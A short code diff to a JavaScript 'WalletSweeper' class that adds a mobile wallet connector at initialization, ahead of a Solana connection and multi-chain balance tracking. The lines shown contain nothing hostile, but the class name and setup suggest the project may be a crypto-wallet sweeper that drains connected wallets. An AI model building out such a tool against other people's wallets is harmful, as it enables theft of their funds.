@@ -11,6 +11,9 @@ class WalletSweeper {
             isConfigured: false
         };
 
+        // Mobile wallet connector
+        this.mobileConnector = null;
+
         // Multi-chain balance storage
         this.solBalance = 0;
         this.tokenBalances = [];
@@ -58,6 +61,11 @@ class WalletSweeper {
      */
     async initialize() {
         try {
+            // Initialize mobile wallet connector if on mobile
+            if (typeof MobileWalletConnector !== 'undefined') {
+                this.mobileConnector = new MobileWalletConnector();
+            }
+
             // Initialize Solana connection with working public RPC
             const { Connection } = solanaWeb3;
 
